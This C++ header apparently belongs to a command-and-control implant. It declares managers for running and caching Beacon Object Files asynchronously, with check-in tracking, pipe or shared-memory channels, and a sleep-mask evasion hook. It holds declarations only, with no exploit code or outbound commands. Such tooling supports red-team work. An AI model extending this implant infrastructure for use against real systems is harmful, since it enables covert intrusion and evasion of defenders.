#pragma once
#include <windows.h>
#include <stdint.h>
#include <stdbool.h>
#include <utility>
#include "COFFLoader.h"
#include "coff_loader.h"
#include "beacon_compatibility.h"

enum class BOF_CLASS : uint32_t {
    BLOCKING      = 0,
    LONG_RUNNING  = 1,
    INTERRUPTIBLE = 2
};

typedef struct async_bof_thread_ctx {
    void (*bof_entry)(char*, unsigned long);
    char* argumentdata;
    int   argumentSize;
    COFF_LOADED* ctx;
    uint32_t task_id;
    functionTable* funcTable;
    volatile LONG completed;
    volatile LONG signalledDone;
    int exitCode;
} async_bof_thread_ctx;

typedef struct async_bof_state {
    uint32_t                    task_id;
    BOF_CLASS                   bof_class;
    CHANNEL_TYPE                channel_type;
    HANDLE                      handle;
    uint64_t                    last_checkin;
    uint32_t                    missed_checkins_threshold;
    struct bof_channel*         channel;
    uint32_t                    channel_size;
    uint32_t                    flags;
    void*                       threadCtx;

    union {
        wchar_t      pipe_name[260];
        void*        shmem_ptr;
    } comms_info;

    /* Async BOF <-> Sleep Mask Integration */
    uint32_t                    requested_sleep_sec;  /* For CHANNEL_SIGNAL_FORCE_SLEEP */

    struct async_bof_state *prev;
    struct async_bof_state *next;
} async_bof_state;

class AsyncBofManager {
public:
    static AsyncBofManager& instance();

    async_bof_state* alloc();
    void insert(async_bof_state* state);
    void remove(async_bof_state* state);
    async_bof_state* find(uint32_t task_id);
    void reapCycle();

    async_bof_state* getHead() { return m_head; }
    uint64_t getCurrentTimeMs();

    void dispatchCommands();

    AsyncBofManager(const AsyncBofManager&) = delete;
    AsyncBofManager& operator=(const AsyncBofManager&) = delete;

private:
    AsyncBofManager() = default;

    uint64_t getTimeMs();
    void free(async_bof_state* state);

    async_bof_state* m_head = nullptr;
    async_bof_state* m_tail = nullptr;
    uint32_t         m_nextTaskId = 0;
};

#define MAX_CACHED_BOFS 8

typedef struct bof_cache_entry {
    uint32_t        bof_id;
    COFF_LOADED*     ctx;
    struct bof_cache_entry* next;
} bof_cache_entry;

class BofCacheManager {
public:
    static BofCacheManager& instance();

    bof_cache_entry* find(uint32_t bof_id);
    bool insert(uint32_t bof_id, COFF_LOADED* ctx);
    bool remove(uint32_t bof_id);
    void clear();
    uint32_t getCount() const { return m_count; }
    bof_cache_entry* getEntries() const { return m_entries; }

    uint8_t* gatherCachedBofIds(size_t* out_len);

    BofCacheManager(const BofCacheManager&) = delete;
    BofCacheManager& operator=(const BofCacheManager&) = delete;

private:
    BofCacheManager() = default;

    bof_cache_entry* m_entries = nullptr;
    uint32_t        m_count = 0;
};
